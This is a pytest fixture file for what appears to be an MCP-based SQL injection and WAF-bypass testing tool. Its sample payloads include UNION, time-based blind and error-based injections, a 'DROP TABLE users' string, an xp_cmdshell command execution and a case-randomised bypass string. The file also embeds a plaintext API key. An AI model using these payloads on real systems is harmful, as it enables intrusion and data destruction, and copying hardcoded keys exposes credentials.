import pytest
import pytest_asyncio
import os
import sys
import logging
import json
import aiohttp
from typing import Dict, Any, AsyncGenerator

# Add project root to Python path
project_root = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
sys.path.insert(0, project_root)

from server.core.mcp_server import MCPServer
from server.techniques.injection_handler import InjectionHandler
from server.bypass.waf_bypass import WAFBypass
from server.payloads.payload_manager import PayloadManager
from server.integrations.integration_manager import IntegrationManager

# Configure logging for tests
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

@pytest_asyncio.fixture
async def integration_manager() -> AsyncGenerator[IntegrationManager, None]:
    """Async fixture for integration manager"""
    manager = IntegrationManager(api_key="sk-1bd5de3f31db429cb8cbe73875537c5c")
    await manager.initialize()
    yield manager
    await manager.close()

@pytest.fixture
def mcp_server() -> MCPServer:
    """Fixture for MCP server"""
    return MCPServer()

@pytest.fixture
def injection_handler() -> InjectionHandler:
    """Fixture for injection handler"""
    return InjectionHandler()

@pytest.fixture
def waf_bypass() -> WAFBypass:
    """Fixture for WAF bypass"""
    return WAFBypass()

import pytest_asyncio

@pytest_asyncio.fixture
async def payload_manager() -> PayloadManager:
    """Async fixture for payload manager"""
    manager = PayloadManager()
    await manager.initialize()
    yield manager

@pytest.fixture(scope="session")
def api_key() -> str:
    """Provide Deepseek API key for tests"""
    return "sk-1bd5de3f31db429cb8cbe73875537c5c"

@pytest.fixture
def mock_response():
    """Mock response fixture"""
    class MockResponse:
        def __init__(self, status_code: int, text: str):
            self.status_code = status_code
            self.text = text
            
        def json(self):
            return json.loads(self.text)
    return MockResponse

@pytest.fixture(scope="session")
def test_config() -> Dict[str, Any]:
    """Provide test configuration"""
    return {
        "server": {
            "host": "localhost",
            "port": 8000,
            "debug": True
        },
        "deepseek": {
            "api_url": "https://api.deepseek.com/v1",
            "timeout": 30
        },
        "injection": {
            "max_retries": 3,
            "timeout": 10
        },
        "waf_bypass": {
            "max_attempts": 5,
            "delay": 1
        },
        "payloads": {
            "max_size": 1000,
            "cache_duration": 3600
        }
    }

@pytest.fixture(scope="session")
def sample_payloads() -> Dict[str, str]:
    """Provide sample payloads for testing"""
    return {
        "union": "' UNION SELECT NULL,NULL,NULL--",
        "blind": "' AND SLEEP(5)--",
        "error": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "stacked": "'; DROP TABLE users--",
        "stored_proc": "'; EXEC xp_cmdshell 'net user'--",
        "nosql": '{"$ne": null}'
    }

@pytest.fixture(scope="session")
def sample_targets() -> Dict[str, str]:
    """Provide sample target URLs for testing"""
    return {
        "mysql": "http://example.com/mysql_vuln.php",
        "mssql": "http://example.com/mssql_vuln.asp",
        "postgres": "http://example.com/pg_vuln.php",
        "nosql": "http://example.com/mongo_vuln.js"
    }

@pytest.fixture(scope="function")
async def mock_deepseek_response() -> Dict[str, Any]:
    """Provide mock Deepseek API response"""
    return {
        "analysis": {
            "vulnerability_type": "sql_injection",
            "risk_level": "high",
            "explanation": "The query is vulnerable to SQL injection",
            "mitigation": "Use prepared statements",
            "exploit_scenario": "An attacker could bypass authentication",
            "bypass_techniques": [
                {
                    "name": "case_randomization",
                    "effectiveness": "high"
                },
                {
                    "name": "comment_injection",
                    "effectiveness": "medium"
                }
            ],
            "recommended_payload": "SeLeCt/**/*/**/FrOm/**/users"
        }
    }

@pytest.fixture(scope="function")
def temp_test_dir(tmp_path):
    """Provide temporary directory for test files"""
    test_dir = tmp_path / "test_files"
    test_dir.mkdir()
    return test_dir

@pytest.fixture(autouse=True)
def cleanup_after_test():
    """Cleanup after each test"""
    yield
    # Add any cleanup logic here if needed

def pytest_configure(config):
    """Configure pytest"""
    config.addinivalue_line(
        "markers",
        "integration: mark test as integration test"
    )
    config.addinivalue_line(
        "markers",
        "slow: mark test as slow running"
    )

def pytest_collection_modifyitems(config, items):
    """Modify test items based on markers"""
    if not config.getoption("--run-slow"):
        skip_slow = pytest.mark.skip(reason="need --run-slow option to run")
        for item in items:
            if "slow" in item.keywords:
                item.add_marker(skip_slow)

def pytest_addoption(parser):
    """Add custom command line options"""
    parser.addoption(
        "--run-slow",
        action="store_true",
        default=False,
        help="run slow tests"
    )
    parser.addoption(
        "--integration",
        action="store_true",
        default=False,
        help="run integration tests"
    )
